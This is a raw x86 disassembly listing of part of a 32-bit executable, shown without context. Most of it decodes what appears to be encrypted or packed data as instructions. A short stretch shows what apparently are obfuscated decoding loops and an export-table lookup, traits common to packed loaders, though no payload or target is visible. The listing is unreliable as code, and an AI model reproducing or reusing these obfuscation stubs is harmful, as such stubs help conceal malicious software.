  404959:	fistp  DWORD PTR [edi+ecx*8+0x2f]
  40495d:	outs   dx,DWORD PTR ds:[esi]
  40495e:	mov    cl,0x55
  404960:	enter  0xa75e,0xfb
  404964:	call   0xf38d9971
  404969:	out    dx,al
  40496a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40496b:	cmp    dl,BYTE PTR [ebx]
  40496d:	inc    edx
  40496e:	mov    esi,0x2c969b44
  404973:	retf   
  404974:	push   0x19
  404976:	out    dx,al
  404977:	push   ebx
  404978:	out    dx,al
  404979:	rcl    DWORD PTR [esi],cl
  40497b:	or     al,0xab
  40497d:	sbb    BYTE PTR [edi+0x1dd8791a],dl
  404983:	lods   eax,DWORD PTR ds:[esi]
  404984:	out    0x20,al
  404986:	sub    eax,0xdc64439a
  40498b:	aam    0x7f
  40498d:	in     al,0xa1
  40498f:	inc    ebx
  404990:	shl    DWORD PTR [edi+eiz*2+0x48e95483],1
  404997:	out    dx,eax
  404998:	pop    edx
  404999:	je     0x404a17
  40499b:	popf   
  40499c:	imul   edi,DWORD PTR [edi-0xa],0x68
  4049a0:	mov    dh,0xab
  4049a2:	and    al,BYTE PTR [ebx-0x7f567c6f]
  4049a8:	stc    
  4049a9:	inc    esi
  4049aa:	ffree  st(2)
  4049ac:	in     eax,0x8a
  4049ae:	iret   
  4049af:	ins    DWORD PTR es:[edi],dx
  4049b0:	mov    al,ds:0x786e8a67
  4049b5:	aaa    
  4049b6:	xchg   esp,eax
  4049b7:	pusha  
  4049b8:	mov    ebp,0xf587cf13
  4049bd:	dec    edi
  4049be:	fwait
  4049bf:	adc    BYTE PTR [eax-0x536ccc48],0x2d
  4049c6:	sub    al,0xf4
  4049c8:	clc    
  4049c9:	ins    BYTE PTR es:[edi],dx
  4049ca:	mov    WORD PTR [ebx+0x27],ds
  4049cd:	add    ebp,DWORD PTR [esi]
  4049cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d0:	fsubr  DWORD PTR [ecx+ebx*2]
  4049d3:	adc    edx,DWORD PTR [edx]
  4049d5:	mov    fs,WORD PTR [ecx+ebp*1+0x430d376d]
  4049dc:	fmul   QWORD PTR [ebx+eiz*2]
  4049df:	fsubp  st(6),st
  4049e1:	enter  0x81e3,0x47
  4049e5:	add    DWORD PTR [eax+0x66],ecx
  4049e8:	mov    dl,0xa9
  4049ea:	mov    al,0xbf
  4049ec:	mov    eax,ds:0xdecce8b1
  4049f1:	sbb    bh,bh
  4049f3:	ins    BYTE PTR es:[edi],dx
  4049f4:	call   0x5b3b:0xec6aaa5
  4049fb:	test   eax,0x5600f2b1
  404a00:	or     al,0xf
  404a02:	push   cs
  404a03:	cwde   
  404a04:	mov    ss,WORD PTR [edx]
  404a06:	xlat   BYTE PTR ds:[ebx]
  404a07:	add    eax,0x601fc6d8
  404a0c:	repnz repnz push ss
  404a0f:	sbb    al,0xbc
  404a11:	mov    ebx,0xdcaa7c7e
  404a16:	push   ds
  404a17:	leave  
  404a18:	pushf  
  404a19:	inc    edx
  404a1a:	mov    ch,0xf1
  404a1c:	xlat   BYTE PTR ds:[ebx]
  404a1d:	jo     0x4049bc
  404a1f:	outs   dx,DWORD PTR ds:[esi]
  404a20:	xchg   esp,eax
  404a21:	mov    ebp,0xa243362d
  404a26:	jge    0x404a3a
  404a28:	(bad)  
  404a2a:	in     al,dx
  404a2b:	push   es
  404a2c:	and    ch,cl
  404a2e:	in     al,dx
  404a2f:	cld    
  404a30:	cmp    cl,0x9
  404a33:	js     0x4049ce
  404a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a36:	aas    
  404a37:	jnp    0x404a3f
  404a39:	pushf  
  404a3a:	dec    edx
  404a3b:	je     0x404a44
  404a3d:	add    DWORD PTR [esp+edx*1],ebp
  404a40:	enter  0xbbb3,0xf7
  404a44:	js     0x404a4d
  404a46:	sbb    ah,BYTE PTR [edx+0x22d75c1d]
  404a4c:	fstp   DWORD PTR [eax-0x39]
  404a4f:	push   esi
  404a50:	cld    
  404a51:	and    al,0x3e
  404a53:	das    
  404a54:	inc    esp
  404a55:	sbb    ebx,DWORD PTR [ecx-0x14fdec74]
  404a5b:	nop
  404a5c:	mov    edx,0x208e9711
  404a61:	sbb    BYTE PTR [esp+eax*4],dh
  404a64:	in     eax,dx
  404a65:	into   
  404a66:	hlt    
  404a67:	in     al,dx
  404a68:	outs   dx,BYTE PTR ds:[esi]
  404a69:	xchg   ebp,eax
  404a6a:	jns    0x404a3d
  404a6c:	sti    
  404a6d:	pop    ecx
  404a6e:	push   eax
  404a6f:	mov    WORD PTR [esi+0x26],cs
  404a72:	jle    0x404ad2
  404a74:	mov    al,BYTE PTR [ebp+0x3]
  404a77:	fnstenv [edx-0x2668126a]
  404a7d:	sar    BYTE PTR [edi+ebx*4+0x1c],cl
  404a81:	or     eax,0xfce975ae
  404a86:	mov    esp,0x40808591
  404a8b:	or     eax,DWORD PTR [edx-0x611ab20c]
  404a91:	push   eax
  404a92:	shl    BYTE PTR [ecx],cl
  404a94:	pop    eax
  404a95:	mov    cl,0x39
  404a97:	xor    ecx,DWORD PTR [ecx-0x3912def]
  404a9d:	retf   0x8163
  404aa0:	ins    BYTE PTR es:[edi],dx
  404aa1:	out    dx,eax
  404aa2:	fnstsw WORD PTR [edi+0x35]
  404aa5:	unpckhps xmm3,XMMWORD PTR [ebx]
  404aa8:	cmp    esp,ebx
  404aaa:	add    al,0xed
  404aac:	test   al,0x18
  404aae:	das    
  404aaf:	mov    eax,0xb249f84a
  404ab4:	pusha  
  404ab5:	push   ss
  404ab6:	and    al,0x9b
  404ab8:	xchg   ebp,eax
  404ab9:	loop   0x404b03
  404abb:	pop    ebx
  404abc:	stc    
  404abd:	mov    al,0x4b
  404abf:	mov    esp,0x49b4d295
  404ac4:	clc    
  404ac5:	je     0x404ab2
  404ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ac8:	test   al,0x80
  404aca:	idiv   BYTE PTR [eax-0x40]
  404acd:	outs   dx,DWORD PTR ds:[esi]
  404ace:	jnp    0x404aa2
  404ad0:	shl    DWORD PTR [ebx-0x5a],1
  404ad3:	mov    bh,0xd8
  404ad5:	clc    
  404ad6:	daa    
  404ad7:	aas    
  404ad8:	cwde   
  404ad9:	fs or  al,0x64
  404adc:	ins    BYTE PTR es:[edi],dx
  404add:	fwait
  404ade:	mov    dl,cl
  404ae0:	(bad)  
  404ae1:	stos   BYTE PTR es:[edi],al
  404ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae3:	lock cli 
  404ae5:	icebp  
  404ae6:	pop    edx
  404ae7:	mov    cl,0xc6
  404ae9:	out    dx,eax
  404aea:	adc    ebp,0x57a59470
  404af0:	add    eax,0xe0a45719
  404af5:	icebp  
  404af6:	add    edi,edi
  404af8:	pop    esp
  404af9:	mov    esp,0xeee6ca11
  404afe:	sub    DWORD PTR [edx+0x62],edx
  404b01:	mov    ebx,0xf7d6b315
  404b06:	test   al,0x55
  404b08:	adc    ecx,edx
  404b0a:	mov    ds:0x99a07e82,eax
  404b0f:	pop    edi
  404b10:	pop    ebp
  404b11:	popa   
  404b12:	sbb    BYTE PTR [edi+0x59],dh
  404b15:	inc    esi
  404b16:	cli    
  404b17:	cmp    edx,DWORD PTR [edx-0x625662cb]
  404b1d:	dec    eax
  404b1e:	cmp    al,0x1f
  404b20:	clc    
  404b21:	cmp    al,BYTE PTR [edx-0x54]
  404b24:	leave  
  404b25:	jmp    0xe687186d
  404b2a:	and    esi,DWORD PTR [eax+edi*8-0x14]
  404b2e:	fwait
  404b2f:	inc    esp
  404b30:	test   eax,0xa2dcfc9b
  404b35:	cdq    
  404b36:	stos   BYTE PTR es:[edi],al
  404b37:	lock fist DWORD PTR [esi]
  404b3a:	jp     0x404b4e
  404b3c:	scas   eax,DWORD PTR es:[edi]
  404b3d:	sub    DWORD PTR [ecx+0x4bd5de0e],esi
  404b43:	mov    al,BYTE PTR [edx+ebx*2-0x45]
  404b47:	cmp    al,0x8c
  404b49:	(bad)  
  404b4a:	fs test al,0xfc
  404b4d:	adc    BYTE PTR [esi-0x5881c09b],ah
  404b53:	out    0xa4,al
  404b55:	and    ch,BYTE PTR [ecx]
  404b57:	mov    dl,0x99
  404b59:	(bad)  
  404b5b:	cdq    
  404b5c:	dec    eax
  404b5d:	mov    esi,0x1c911e73
  404b62:	(bad)  
  404b63:	(bad)  
  404b65:	pop    ebx
  404b66:	ds dec ebx
  404b68:	stos   DWORD PTR es:[edi],eax
  404b69:	xchg   esp,eax
  404b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6b:	add    DWORD PTR [esi-0x54],ebp
  404b6e:	imul   ebx,esp,0x4a635f30
  404b74:	and    bl,bl
  404b76:	push   edx
  404b77:	xchg   esp,eax
  404b78:	in     al,dx
  404b79:	jp     0x404bb2
  404b7b:	jb     0x404b31
  404b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b7e:	icebp  
  404b7f:	cmp    al,0x55
  404b81:	(bad)  
  404b82:	pushf  
  404b83:	adc    eax,0x283f8fa6
  404b88:	jo     0x404bcc
  404b8a:	or     DWORD PTR [eax+edi*2+0xf],0xffffffa1
  404b8f:	adc    eax,0x375caa47
  404b94:	xchg   esp,eax
  404b95:	in     al,0xe1
  404b97:	xor    ah,ah
  404b99:	jo     0x404b26
  404b9b:	fiadd  DWORD PTR [ebp*8-0x37bf4c31]
  404ba2:	test   BYTE PTR [ebx],ch
  404ba4:	je     0x404bdf
  404ba6:	test   eax,0x816db432
  404bab:	imul   ecx,DWORD PTR [edi+edi*8],0xc
  404baf:	push   es
  404bb0:	(bad)  
  404bb1:	cvtps2pi mm5,xmm2
  404bb4:	mov    dh,0x7c
  404bb6:	jecxz  0x404b3f
  404bb8:	xor    eax,0xdf1114c3
  404bbd:	(bad)  
  404bbe:	pushf  
  404bbf:	jno    0x404ba4
  404bc1:	mov    ds:0x4877172c,eax
  404bc6:	das    
  404bc7:	push   ecx
  404bc8:	xchg   edi,eax
  404bc9:	xchg   ebp,eax
  404bca:	xor    BYTE PTR [ebx+0x2a6b0c9e],ch
  404bd0:	ficom  DWORD PTR [ebx]
  404bd2:	rcl    BYTE PTR [edi+ebx*4-0x7d],1
  404bd6:	jl     0x404bba
  404bd8:	nop
  404bd9:	push   ss
  404bda:	dec    esi
  404bdb:	pop    es
  404bdc:	(bad)  
  404bdd:	stc    
  404bde:	jmp    0x404b7a
  404be0:	imul   esp,DWORD PTR [edx+ebp*8+0x323b3991],0x54
  404be8:	jecxz  0x404c5d
  404bea:	leave  
  404beb:	(bad)  
  404bec:	(bad)  
  404bed:	mov    ds:0x11c45360,al
  404bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf3:	imul   esi,DWORD PTR [bp+di],0x4a
  404bf7:	xor    BYTE PTR [ebx+edx*1],dl
  404bfa:	add    al,0x3a
  404bfc:	scas   al,BYTE PTR es:[edi]
  404bfd:	daa    
  404bfe:	ins    BYTE PTR es:[edi],dx
  404bff:	mov    ds:0xb24d6f06,eax
  404c04:	cmc    
  404c05:	cmp    eax,0x6f029bd3
  404c0a:	ret    0x1862
  404c0d:	ins    DWORD PTR es:[edi],dx
  404c0e:	pop    ds
  404c0f:	push   ebp
  404c10:	xchg   DWORD PTR [ecx],esi
  404c12:	dec    esp
  404c13:	pusha  
  404c14:	cmp    edx,DWORD PTR ds:0x818750c
  404c1a:	cmp    BYTE PTR [eax+ecx*4-0x34],bh
  404c1e:	cmp    eax,0x18cdf12f
  404c23:	ins    DWORD PTR es:[edi],dx
  404c24:	mov    ebp,0xf040cb80
  404c29:	dec    ebx
  404c2a:	push   eax
  404c2b:	les    esi,FWORD PTR [esi+0x61]
  404c2e:	int    0xc3
  404c30:	in     eax,0x18
  404c32:	mov    ah,0x70
  404c34:	fdiv   DWORD PTR [eax+0x34]
  404c37:	xchg   ebp,eax
  404c38:	mov    bh,0x22
  404c3a:	and    edx,DWORD PTR [eax-0x62]
  404c3d:	xchg   edx,eax
  404c3e:	add    al,0x76
  404c40:	fsubr  DWORD PTR [ecx+0x4bd7a5ab]
  404c46:	push   eax
  404c47:	and    edi,DWORD PTR [esi-0x6f694f59]
  404c4d:	(bad)  
  404c4f:	cmp    eax,DWORD PTR [edx]
  404c51:	lahf   
  404c52:	pop    edx
  404c53:	test   BYTE PTR ds:0x45227e59,bh
  404c59:	lods   al,BYTE PTR ds:[esi]
  404c5a:	aaa    
  404c5b:	mov    bl,0xe9
  404c5d:	push   edi
  404c5e:	fisub  DWORD PTR [esi-0x5c4c4d1e]
  404c64:	push   esp
  404c65:	push   ecx
  404c66:	dec    edi
  404c67:	in     eax,0x7c
  404c69:	jo     0x404c98
  404c6b:	and    eax,0xd843ee1e
  404c70:	mov    ds:0x84aacee,eax
  404c75:	pop    edi
  404c76:	jo     0x404c8b
  404c78:	mov    ah,0x2b
  404c7a:	ffreep st(5)
  404c7c:	aas    
  404c7d:	and    edx,esp
  404c7f:	sub    eax,DWORD PTR [ebx+ecx*4-0x2b]
  404c83:	ss sub al,0x0
  404c86:	sub    BYTE PTR [esi+0x21],al
  404c89:	sbb    esp,DWORD PTR [edi-0x75]
  404c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c8d:	add    dh,al
  404c8f:	adc    DWORD PTR [ebx+esi*2-0x23],0x26
  404c94:	mov    eax,0x8be3c122
  404c99:	idiv   BYTE PTR [ebx+eiz*2+0x6d7d3cff]
  404ca0:	sub    ah,BYTE PTR [esi-0x2d9c8f8c]
  404ca6:	and    al,al
  404ca8:	jnp    0x404ceb
  404caa:	xchg   esi,eax
  404cab:	cmp    cl,al
  404cad:	call   0xbf77:0x14352966
  404cb4:	clc    
  404cb5:	push   cs
  404cb6:	mov    bl,al
  404cb8:	push   ebp
  404cb9:	out    dx,eax
  404cba:	lds    ecx,FWORD PTR [ecx]
  404cbc:	push   cs
  404cbd:	xchg   ebp,eax
  404cbe:	(bad)  
  404cbf:	aam    0x4c
  404cc1:	and    eax,ecx
  404cc3:	xchg   DWORD PTR [edi-0x4698419a],ebx
  404cc9:	jne    0x404d3b
  404ccb:	xchg   ebx,eax
  404ccc:	iret   
  404ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cce:	mov    ds:0x58ba4a69,al
  404cd3:	shr    BYTE PTR [ebp-0x730451fc],1
  404cd9:	dec    ebx
  404cda:	(bad)  
  404cdb:	loope  0x404d0d
  404cdd:	adc    al,0xf2
  404cdf:	pop    esp
  404ce0:	es cs sbb bh,bh
  404ce4:	push   es
  404ce5:	dec    ebp
  404ce6:	mov    WORD PTR [edx+0x5c],gs
  404ce9:	push   es
  404cea:	push   cs
  404ceb:	ret    0x1d69
  404cee:	clc    
  404cef:	or     dl,BYTE PTR [eax-0x1f96177d]
  404cf5:	pop    es
  404cf6:	pop    ds
  404cf7:	mov    BYTE PTR [eax+0x5a],al
  404cfa:	dec    edi
  404cfb:	sub    BYTE PTR [ebx+ecx*4],0x45
  404cff:	in     al,dx
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x54aa7d7b
  404d49:	sbb    eax,0x2f1bc32a
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404cfd
  404d55:	popf   
  404d56:	mov    DWORD PTR [eax+ebx*1-0x7],esp
  404d5a:	mov    edi,0xafc6fbc5
  404d5f:	retf   
  404d60:	cli    
  404d61:	call   DWORD PTR [ecx-0x52]
  404d64:	jmp    0x404dd8
  404d66:	(bad)  
  404d67:	call   0x7d909206
  404d6c:	arpl   WORD PTR [ebx-0x75],cx
  404d6f:	inc    ecx
  404d70:	or     ah,BYTE PTR [ebp-0x45435863]
  404d76:	dec    esp
  404d77:	mov    eax,0xdcdf5456
  404d7c:	retf   
  404d7d:	loopne 0x404db4
  404d7f:	aaa    
  404d80:	or     DWORD PTR es:[ebp+0xf],ecx
  404d84:	ret    
  404d85:	pop    ebx
  404d86:	sub    esi,edx
  404d88:	and    DWORD PTR [esi-0x1d8b80ee],edx
  404d8e:	in     al,dx
  404d8f:	stc    
  404d90:	jne    0x404d64
  404d92:	mov    bh,0x0
  404d94:	sbb    ebx,DWORD PTR [ecx]
  404d96:	dec    ebp
  404d97:	call   0xfec9:0x3fc78b43
  404d9e:	das    
  404d9f:	std    
  404da0:	sub    al,0xf7
  404da2:	das    
  404da3:	sti    
  404da4:	sbb    bh,BYTE PTR [ecx+ebp*8+0x3bb495b3]
  404dab:	xchg   ebx,eax
  404dac:	push   0x4ab01ff5
  404db1:	inc    eax
  404db2:	adc    esi,0x26
  404db5:	arpl   WORD PTR [edi+0x6e5b6ba],cx
  404dbb:	dec    edi
  404dbc:	(bad)  
  404dbd:	int3   
  404dbe:	jmp    0xc0b1887b
  404dc3:	xchg   edi,eax
  404dc4:	stc    
  404dc5:	sbb    DWORD PTR [edx],esi
  404dc7:	inc    ecx
  404dc8:	test   al,0xe8
  404dca:	ficom  DWORD PTR [ebx]
  404dcc:	jne    0x404d8c
  404dce:	fst    st(2)
  404dd0:	and    bl,bl
  404dd2:	push   cs
  404dd3:	pop    ds
  404dd4:	cmp    esi,DWORD PTR [eax+0x5e]
  404dd7:	fimul  DWORD PTR [edx-0x3fddb828]
  404ddd:	mov    dl,0xce
  404ddf:	stc    
  404de0:	stos   BYTE PTR es:[edi],al
  404de1:	push   es
  404de2:	inc    ebx
  404de3:	ss int 0x21
  404de6:	xchg   ecx,eax
  404de7:	dec    ecx
  404de8:	lock adc eax,0x617c8c51
  404dee:	dec    esi
  404def:	les    ebx,FWORD PTR [esp+edi*8]
  404df2:	pop    ecx
  404df3:	cmp    ch,bh
  404df5:	nop
  404df6:	pop    ecx
  404df7:	sub    ch,BYTE PTR [ebx-0x1d]
  404dfa:	sbb    edx,ecx
  404dfc:	xor    eax,0x626a63cb
  404e01:	repz addr16 in al,dx
  404e04:	mov    al,ds:0x81d914c6
  404e09:	into   
  404e0a:	cwde   
  404e0b:	cmp    eax,DWORD PTR ds:0x5b1d3df3
  404e11:	ret    0x7b30
  404e14:	sbb    esi,eax
  404e16:	mov    DWORD PTR [esi-0x4d],edx
  404e19:	lock (bad) [esi+0x64f80baf]
  404e20:	fwait
  404e21:	push   ecx
  404e22:	jnp    0x404e0e
  404e24:	pop    ebx
  404e25:	clc    
  404e26:	dec    edx
  404e27:	std    
  404e28:	mov    ds:0xc4b400aa,eax
  404e2d:	dec    DWORD PTR [eax+eiz*1-0x5f247755]
  404e34:	adc    ch,BYTE PTR [ecx-0x4b]
  404e37:	mov    dh,BYTE PTR [ecx-0x37c3ed5f]
  404e3d:	pop    esp
  404e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e3f:	add    al,0x5f
  404e41:	shl    DWORD PTR [edi],1
  404e43:	xchg   esi,eax
  404e44:	sub    ch,BYTE PTR [eax-0x2f216c67]
  404e4a:	imul   edx,DWORD PTR [ecx-0x57],0xffffffdc
  404e4e:	not    DWORD PTR [ebx]
  404e50:	mov    esp,0x31db4225
  404e56:	sahf   
  404e57:	add    eax,DWORD PTR [eax-0x2aec61c9]
  404e5d:	leave  
  404e5e:	sahf   
  404e5f:	clc    
  404e60:	and    ebx,DWORD PTR [esi-0x2]
  404e63:	inc    ebx
  404e64:	or     DWORD PTR [edx-0x11],eax
  404e67:	pop    ds
  404e68:	aas    
  404e69:	outs   dx,BYTE PTR ds:[esi]
  404e6a:	stos   BYTE PTR es:[edi],al
  404e6b:	arpl   cx,cx
  404e6d:	(bad)  
  404e6e:	xor    bh,BYTE PTR [eax+0x6ad70fe4]
  404e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e75:	cmp    esi,DWORD PTR [edx+0x123aaedc]
  404e7b:	ret    0x4e2b
  404e7e:	jl     0x404e3d
  404e80:	in     al,0xc7
  404e82:	cld    
  404e83:	inc    edi
  404e84:	cmp    BYTE PTR [edx+0x42],cl
  404e87:	(bad)  
  404e88:	aad    0x3e
  404e8a:	or     esp,DWORD PTR [ebp+0x27]
  404e8d:	in     eax,0xac
  404e8f:	dec    esp
  404e90:	or     bh,al
  404e92:	fs dec eax
  404e94:	stos   DWORD PTR es:[edi],eax
  404e95:	push   ebx
  404e96:	fldenv [eax+edx*8-0x1032bb63]
  404e9d:	aam    0x4f
  404e9f:	adc    BYTE PTR [esi-0x75],dl
  404ea2:	shl    DWORD PTR [eax],cl
  404ea4:	add    ch,dh
  404ea6:	sar    BYTE PTR [ebx-0x2f],0x56
  404eaa:	in     eax,dx
  404eab:	mov    ebx,ebx
  404ead:	jo     0x404e7f
  404eaf:	ins    BYTE PTR es:[edi],dx
  404eb0:	fidivr WORD PTR [edi+esi*8+0x2ebb1241]
  404eb7:	sub    eax,0xf3377282
  404ebc:	add    al,0x54
  404ebe:	or     al,al
  404ec0:	or     DWORD PTR [edi+eiz*2-0x3132fb43],ebp
  404ec7:	mov    cs,WORD PTR [ebp+0x4b]
  404eca:	sahf   
  404ecb:	inc    eax
  404ecc:	test   al,0x45
  404ece:	inc    esp
  404ecf:	and    al,BYTE PTR gs:[edi]
  404ed2:	jb     0x404eb7
  404ed4:	outs   dx,BYTE PTR ds:[esi]
  404ed5:	mov    edx,DWORD PTR ds:0x7ca3e7e0
  404edb:	ins    DWORD PTR es:[edi],dx
  404edc:	and    BYTE PTR [edi],0x77
  404edf:	add    eax,esi
  404ee1:	mov    edi,0x29847083
  404ee6:	test   DWORD PTR [edx+0x79],eax
  404ee9:	mov    ds:0x56557ebb,eax
  404eee:	dec    ecx
  404eef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ef0:	(bad)  
  404ef1:	adc    DWORD PTR [ebx],eax
  404ef3:	idiv   BYTE PTR [eax+0xb242c5b]
  404ef9:	shl    BYTE PTR [ebx+0x3b],cl
  404efc:	dec    ebx
  404efd:	mov    bl,0x8d
  404eff:	pop    eax
  404f00:	add    esp,DWORD PTR [eax+0x1447d987]
  404f06:	and    bl,BYTE PTR gs:[eax]
  404f09:	mov    esi,0x3615c3c0
  404f0e:	leave  
  404f0f:	push   ebp
  404f10:	sbb    edi,DWORD PTR [ecx+0x3b5af1e4]
  404f16:	cmp    eax,DWORD PTR [edx-0x5f]
  404f19:	push   ebp
  404f1a:	pop    esi
  404f1b:	or     al,0x8c
  404f1d:	(bad)  
  404f1e:	pop    eax
  404f1f:	inc    esp
  404f20:	cwde   
  404f21:	mov    di,0xfbec
  404f25:	in     eax,0x3d
  404f27:	jecxz  0x404f9c
  404f29:	fs adc cl,0x39
  404f2d:	jmp    0x7e77:0xed6df5c7
  404f34:	push   ecx
  404f35:	or     edx,DWORD PTR ds:0x43467b
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43470b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43470b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43470b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43470b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43470b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x434673,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434713,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434713
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434713,edx
  404fbc:	cmp    DWORD PTR ds:0x434713,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x4348c9
  404fce:	push   0x43484e
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434713,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x4346b7
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x4346b7,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	(bad)  
  405051:	push   esp
  405052:	mov    ds:0x7e7e297b,al
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x404fff
  40505c:	pop    esp
  40505d:	jecxz  0x405096
  40505f:	jge    0x404fe4
  405061:	pushf  
  405062:	pop    ebp
  405063:	in     al,0x5c
  405065:	xchg   ecx,eax
  405066:	xchg   DWORD PTR [edx],edi
  405068:	js     0x4050a1
  40506a:	jecxz  0x405097
  40506c:	sbb    al,0x58
  40506e:	cmp    eax,0xa008bc4d
  405073:	jns    0x4050c8
  405075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405076:	ret    0x9994
  405079:	data16 scas al,BYTE PTR es:[edi]
  40507b:	fisttp DWORD PTR [ebp-0x38]
  40507e:	iret   
  40507f:	lods   al,BYTE PTR ds:[esi]
  405080:	in     al,dx
  405081:	pop    esp
  405082:	xor    BYTE PTR ds:0x747ad6aa,ah
  405088:	test   al,0xfd
  40508a:	(bad)  
  40508b:	sar    DWORD PTR [edi-0x6cc09594],cl
  405091:	adc    ah,dh
  405093:	ins    DWORD PTR es:[edi],dx
  405094:	shl    DWORD PTR [edx],1
  405096:	adc    al,0x61
  405098:	in     al,dx
  405099:	and    DWORD PTR [edx],esp
  40509b:	pop    edx
  40509c:	add    eax,0x17388220
  4050a1:	fwait
  4050a2:	cli    
  4050a3:	(bad)  
  4050a4:	jle    0x405086
  4050a6:	sub    DWORD PTR [edx-0x2b68f3f9],0xa6b61b04
  4050b0:	jmp    0x4050b8
  4050b2:	adc    ebx,DWORD PTR [ecx-0x6f515b17]
  4050b8:	xlat   BYTE PTR ds:[ebx]
  4050b9:	repnz or al,0x11
  4050bc:	pop    esi
  4050bd:	jg     0x405084
  4050bf:	or     BYTE PTR [eax],bh
  4050c1:	mov    al,ds:0xf10361cf
  4050c6:	rol    BYTE PTR [edi-0x8],1
  4050c9:	xchg   edi,eax
  4050ca:	sbb    BYTE PTR [esp+ecx*2],dh
  4050cd:	out    dx,al
  4050ce:	(bad)  
  4050cf:	cmp    al,0x8d
  4050d1:	add    dh,ch
  4050d3:	jne    0x69b4def9
  4050d9:	push   esi
  4050da:	fld    TBYTE PTR [esi]
  4050dc:	js     0x4050ad
  4050de:	cld    
  4050df:	in     al,dx
  4050e0:	sub    bl,BYTE PTR [eax+0x44]
  4050e3:	mov    ds:0x587769a4,al
  4050e8:	xor    dh,BYTE PTR [ecx+eax*4-0x4d2ab730]
  4050ef:	adc    DWORD PTR [eax],eax
  4050f1:	cmp    eax,0xb1312025
  4050f6:	lds    eax,FWORD PTR [edi]
  4050f8:	int    0x10
  4050fa:	mov    bh,cl
  4050fc:	cmp    dh,dh
  4050fe:	popf   
  4050ff:	xchg   ecx,eax
  405100:	(bad)  
  405101:	jge    0x405123
  405103:	call   0xaa16e5e1
  405108:	xchg   DWORD PTR [ecx],ebx
  40510a:	repnz cmp al,cl
  40510d:	fld    TBYTE PTR [edi+0x64bb3f90]
  405113:	inc    edi
  405114:	xor    eax,0x8207dc20
  405119:	jl     0x405134
  40511b:	cdq    
  40511c:	pop    edx
  40511d:	xlat   BYTE PTR ds:[ebx]
  40511e:	push   0x56
  405120:	sbb    DWORD PTR [edi+0x2f885ab8],esp
  405126:	shl    DWORD PTR [ebp-0x2f4f1132],1
  40512c:	mov    esp,0xd2b1ec9e
